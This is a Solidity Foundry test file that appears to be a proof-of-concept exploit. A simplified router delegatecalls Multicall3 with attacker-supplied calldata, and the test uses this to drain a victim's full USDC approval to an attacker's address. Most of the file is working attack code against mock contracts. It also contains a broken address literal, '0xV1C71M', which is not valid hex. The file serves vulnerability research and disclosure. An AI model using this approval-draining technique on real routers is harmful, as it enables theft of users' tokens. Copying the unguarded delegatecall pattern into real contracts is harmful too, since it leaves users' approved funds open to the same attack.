// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal ERC20 mock to act as USDC - honors approvals based on msg.sender
contract MockERC20 {
    string public name = "Mock USDC";
    string public symbol = "USDC";
    uint8 public decimals = 6;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        // msg.sender is the spender. Inside delegatecall from router to Multicall3,
        // inside Multicall3's target.call => msg.sender = router address.
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allowance");
        allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// Canonical Multicall3 minimal subset (aggregate3Value)
contract Multicall3 {
    struct Call3Value {
        address target;
        bool allowFailure;
        uint256 value;
        bytes callData;
    }

    struct Result {
        bool success;
        bytes returnData;
    }

    function aggregate3Value(Call3Value[] calldata calls)
        external
        payable
        returns (Result[] memory returnData)
    {
        uint256 length = calls.length;
        returnData = new Result[](length);
        Call3Value calldata calli;
        for (uint256 i = 0; i < length; i++) {
            Result memory result = returnData[i];
            calli = calls[i];
            (result.success, result.returnData) = calli.target.call{value: calli.value}(calli.callData);
            require(calli.allowFailure || result.success, "Multicall3: call failed");
        }
    }
}

interface IMulticall3 {
    struct Call3Value {
        address target;
        bool allowFailure;
        uint256 value;
        bytes callData;
    }
    function aggregate3Value(Call3Value[] calldata calls) external payable returns (bytes memory);
}

// Simplified TrailsRouter that mirrors the vulnerable pattern
contract TrailsRouter {
    address public immutable MULTICALL3;

    constructor(address _multicall3) {
        MULTICALL3 = _multicall3;
    }

    function execute(bytes calldata data) external payable {
        (bool ok, bytes memory ret) = MULTICALL3.delegatecall(data);
        require(ok, string(ret));
    }

    receive() external payable {}
}

contract ExploitTest is Test {
    TrailsRouter router;
    Multicall3 multicall;
    MockERC20 usdc;

    address victim = address(0xV1C71M);
    address attacker = address(0xA77ACC);

    function setUp() public {
        multicall = new Multicall3();
        router = new TrailsRouter(address(multicall));
        usdc = new MockERC20();

        // Victim has approved the router (common pattern for routers)
        usdc.mint(victim, 1_000_000e6);
        vm.prank(victim);
        usdc.approve(address(router), type(uint256).max);
    }

    function test_exploit_drainsApprovalViaDelegatecallMulticall() public {
        uint256 stealAmount = 1_000_000e6;

        // Build an aggregate3Value payload that transferFrom(victim -> attacker)
        IMulticall3.Call3Value[] memory calls = new IMulticall3.Call3Value[](1);
        calls[0] = IMulticall3.Call3Value({
            target: address(usdc),
            allowFailure: false,
            value: 0,
            callData: abi.encodeWithSelector(MockERC20.transferFrom.selector, victim, attacker, stealAmount)
        });

        bytes memory data = abi.encodeWithSelector(Multicall3.aggregate3Value.selector, calls);

        // Attacker invokes execute with crafted calldata
        vm.prank(attacker);
        router.execute(data);

        // Invariant violated: attacker drained victim's approval through router context
        assertEq(usdc.balanceOf(attacker), stealAmount, "attacker should have stolen the funds");
        assertEq(usdc.balanceOf(victim), 0, "victim drained");
    }
}